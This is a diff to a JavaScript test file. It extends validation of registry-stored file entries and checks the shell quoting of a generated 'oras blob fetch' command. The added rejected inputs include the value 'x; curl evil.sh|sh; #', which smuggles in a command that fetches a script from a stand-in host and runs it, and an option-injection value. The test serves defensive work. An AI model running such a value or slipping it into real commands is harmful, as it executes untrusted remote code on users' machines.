@@ -131,10 +131,14 @@ test("files kept in a registry are recognised, and fetched as pirn says", () => 
   const sum = "ab".repeat(32);
   const ok = agentJSON({ files: [{ path: "big.bin", size: 3000000, oci: "ghcr.io/acme/files", sha256: sum }] });
   assert.equal(DD.parse(ok).agent.files[0].oci, "ghcr.io/acme/files");
-  for (const bad of [{ path: "a", size: 1, oci: "r" }, { path: "a", size: 1, oci: "r", sha256: "AB" }, { path: "a", size: 1, sha256: sum },
-    { path: "a", size: 1, oci: "r", sha256: sum, text: "x" }]) {
+  for (const bad of [{ path: "a", size: 1, oci: "r" }, { path: "a", size: 1, oci: "ghcr.io/acme/files", sha256: "AB" }, { path: "a", size: 1, sha256: sum },
+    { path: "a", size: 1, oci: "ghcr.io/acme/files", sha256: sum, text: "x" },
+    // Review 10: any string was accepted, and shown inside a command to copy.
+    { path: "a", size: 1, oci: "x; curl evil.sh|sh; #", sha256: sum }, { path: "a", size: 1, oci: "r", sha256: sum },
+    { path: "a", size: 1, oci: "ghcr.io/acme/files:v1", sha256: sum }, { path: "a", size: 1, oci: "-ghcr.io/a", sha256: sum }]) {
     assert.deepEqual(DD.parse(agentJSON({ files: [bad] })), { text: agentJSON({ files: [bad] }) }, JSON.stringify(bad));
   }
   // The same string pirn's TestInv_RegistryIsCheckedBeforeAnyContainer expects.
   assert.equal(DD.fetchCommand("ghcr.io/acme/files", "ab", "my report's.bin"), "oras blob fetch --output 'my report'\\''s.bin' ghcr.io/acme/files@sha256:ab");
+  assert.equal(DD.fetchCommand("ghcr.io/acme/files", "ab", "-"), "oras blob fetch --output './-' ghcr.io/acme/files@sha256:ab");
 });
